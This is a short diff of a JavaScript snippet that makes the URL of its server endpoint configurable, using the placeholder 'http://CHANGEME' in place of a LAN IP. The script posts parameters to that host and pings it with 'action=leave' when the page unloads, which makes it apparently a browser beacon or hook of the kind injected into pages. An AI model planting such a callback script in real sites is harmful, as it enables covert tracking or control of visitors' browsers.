@@ -1,6 +1,7 @@
 (function () {
+	var url = "http://CHANGEME";
 	var preq = new XMLHttpRequest();
-	preq.open("post", "http://192.168.1.200:8000/");
+	preq.open("post", url);
 	preq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 	preq.onload = function () {
 		if (preq.responseText) {
@@ -14,7 +15,7 @@
 	preq.send(params);
 	window.onbeforeunload = function () {
 		preq = new XMLHttpRequest();
-		preq.open("post", "http://192.168.1.200:8000", true);
+		preq.open("post", url, true);
 		preq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 		preq.send("action=leave");
 	}
